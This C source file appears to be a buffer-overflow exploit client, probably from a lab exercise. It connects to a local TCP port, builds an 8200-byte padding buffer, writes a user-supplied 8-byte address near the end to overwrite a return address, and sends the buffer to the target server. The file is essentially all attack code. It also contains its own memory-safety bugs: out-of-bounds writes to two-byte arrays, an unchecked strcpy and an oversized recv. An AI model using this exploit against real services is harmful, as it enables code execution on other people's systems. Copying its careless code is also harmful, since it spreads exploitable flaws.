#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
int main(int argc, char *argv[]){
	int length= strlen(argv[2]);
	char address[18];
	printf("%s\n", argv[2]);
	strcpy(address,argv[2]);
	printf("%s\n",address);
	char hex1[2];
	char hex2[2];
	char hex3[2];
	char hex4[2];
	char hex5[2];
	char hex6[2];
	char hex7[2];
	char hex8[3];
	hex1[0]=address[16];
	hex1[1]=address[17];
	hex1[2]='\0';
	uint  num1 = (int )strtoll(hex1, NULL, 16);
	
	hex2[0]=address[14];
	hex2[1]=address[15];
	hex2[2]='\0';
	uint  num2 = (int )strtoll(hex2, NULL, 16);
	
	hex3[0]=address[12];
	hex3[1]=address[13];
	hex3[2]='\0';
	uint  num3 = (int )strtoll(hex3, NULL, 16);
	
	hex4[0]=address[10];
	hex4[1]=address[11];
	hex4[2]='\0';
	uint  num4 = (int )strtoll(hex4, NULL, 16);
	
	
	hex5[0]=address[8];
	hex5[1]=address[9];
	hex5[2]='\0';
	uint  num5 = (int )strtoll(hex5, NULL, 16);
	
	
	
	hex6[0]=address[6];
	hex6[1]=address[7];
	hex6[2]='\0';
	uint  num6 = (int )strtoll(hex6, NULL, 16);
	
	
	
	hex7[0]=address[4];
	hex7[1]=address[5];
	hex7[2]='\0';
	uint  num7 = (int )strtoll(hex7, NULL, 16);
	
	char hex[1];
	hex[1]=address[3];
	
	
	hex8[0]=address[2];
	hex8[1]=address[3];
	hex8[2]= '\0';
	uint  num8 = (int )strtoll(hex8, NULL, 16);
	
	printf("ss%d\n", num8);
	
	int socket1 = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server;
	server.sin_family=AF_INET;
	int port= atoi(argv[1]);
	
	server.sin_port= htons(port);
	server.sin_addr.s_addr= INADDR_ANY;
	
	
	int cstatus=connect(socket1, (struct sockaddr *) &server, sizeof(server));
	
	if(cstatus==-1){
		printf("connection failed\n");
	}
	else {printf("");
	//close(socket1);
	}
	

	char buffer1[8200];
	buffer1[0]='a';
	buffer1[1]='a';
	buffer1[2]='a';
	buffer1[3]='a';
	buffer1[4]='a';
	buffer1[5]='a';
	buffer1[6]='a';
	buffer1[7]='a';
	buffer1[8]='a';
	buffer1[9]='a';
	buffer1[10]='a';
	buffer1[11]='a';
	buffer1[12]='a';
	
	
for(int i=13;i<200  ;i++){
		buffer1[i]='z';
	}
	for(int i=200;i<8165  ;i++){
		buffer1[i]='b';
	}
	
	for(int i=8165;i<8199  ;i++){
		buffer1[i]='q';
	}
	for(int i=8199;i<8200  ;i++){
		buffer1[i]='q';
	}
	
	
	

	
	
	
	int arr[8200];
	for (int i=0;i<8200;i++){
		
		arr[i]=i;
	}


	long hexnum1= 0xaabbccddeeff1122;
	uint8_t mask = 255;
	uint8_t result;
	
	
	
	
	printf("\n%d\n", buffer1[8167]);
	
	buffer1[8160]=num1;
	buffer1[8161]=num2;
	buffer1[8162]=num3;
	buffer1[8163]=num4;
	buffer1[8164]=num5;
	buffer1[8165]=num6;
	buffer1[8166]=num7;
	buffer1[8167]=num8;
	

	
	
	
	
	
	int n = send(socket1,buffer1,strlen(buffer1),0);
	
	
	 if(n>0){printf("succeded");}
	 if(n<0) {printf("didn't succed");}
	char buffer[200];
	 int recv_length = 1;
	while(1)
	 {
	recv_length = recv(socket1, &buffer, 1024, 0);
	if (recv_length==0){
		
		printf("succeded");
		break;
	}
	 }
	
	close(socket1);
     
	
}